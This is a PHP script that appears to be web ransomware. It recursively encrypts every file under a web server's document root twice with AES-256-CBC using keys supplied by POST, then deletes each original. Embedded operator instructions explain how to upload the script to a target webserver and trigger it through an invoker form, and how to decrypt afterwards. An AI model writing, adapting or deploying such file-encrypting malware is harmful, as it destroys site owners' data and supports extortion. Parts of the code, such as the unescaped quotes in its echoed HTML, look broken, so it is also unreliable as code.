<?php
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        return base64_encode(openssl_encrypt($string, $encrypt_method, $key, 0, $iv));
    }
    else if( $action == 'decrypt' ){
        return openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
}

function encfile($filename){
	if (strpos($filename, '.aes.aes') !== false) {
    return;
	}
	file_put_contents($filename.".aes.aes", (encrypt_decrypt('encrypt', (encrypt_decrypt('encrypt', file_get_contents($filename), $_POST['key1'], $_POST['iv'])), $_POST['key2'], $_POST['iv'])));
	unlink($filename);
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			}else {
				encfile($dir."/".$file);
		}
	}
}

if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
	echo "<html>
<head>

<title>Invoke Encrypt or Decrypt</title>

</head>
<body>

<form method=POST action="server_address_here">
  Key 1:<br>
  <input type="text" name="key1" value="YourAesKey1">
  <br>
  Key 2:<br>
  <input type="text" name="key2" value="YourAesKey2">
  <br>
  IV:<br>
  <input type="text" name="iv" value="YourIV">
  <br><br>
  <input type="submit" value="Submit">
</form> 

<p>
#Encrypt <br />
To encrypt a website, upload the encrypt.php to the webserver, and then edit(with text editor) the 'invoker.html' and change the POST address to encrypt.php(which you uploaded) <br />
<br />
Then open the 'Invoker.html' with any browser and enter the 'Key 1, Key 2 & IV' with appropriate values(The keys you want to encrypt the webserver with, IV stands for 'initialization vector' which is needed in cryptography) and click submit
</p>

<p>
#Decrypt <br />
To decrypt the encrypted webserver, upload the decrypt.php to the webserver and then edit(with text editor) the 'invoker.html' to change the post address to decrypt.php(which you uploaded) <br />
<br />
Then open 'Invoker.html' and enter the appropriate key values(The same ones used to encrypt the webserver or it can lead to data loss) and click submit
</p>
</body>
</html>
";
}
?>
